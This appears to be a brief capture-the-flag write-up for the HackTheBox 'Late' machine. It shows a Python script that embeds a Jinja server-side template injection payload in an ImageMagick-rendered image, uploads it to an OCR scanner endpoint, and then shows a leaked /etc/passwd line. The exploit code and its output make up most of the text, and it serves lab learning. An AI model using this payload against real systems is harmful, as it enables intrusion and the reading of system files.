Domain
```
http://images.late.htb/
```

![](Pasted%20image%2020220626092750.png)

```python
import requests
import os

URL = "http://images.late.htb"

malcious_txt = """\\n\\n   {{"".__class__.__mro__[1].__subclasses__()[1]}}   \\n\\n""".replace("'", "\\'").replace('"', '\\"')
convert = f"""convert -font "fira-code" -fill "#ffffffff" -background black -pointsize 72 label:"{malcious_txt}" label.png"""
print(convert)
os.popen(convert).read()
file = open("label.png", "rb")
r = requests.post(URL+"/scanner", files={"file":file})
print(r.text)
```

```
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
```

## Referensi
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://imagemagick.org/script/command-line-options.php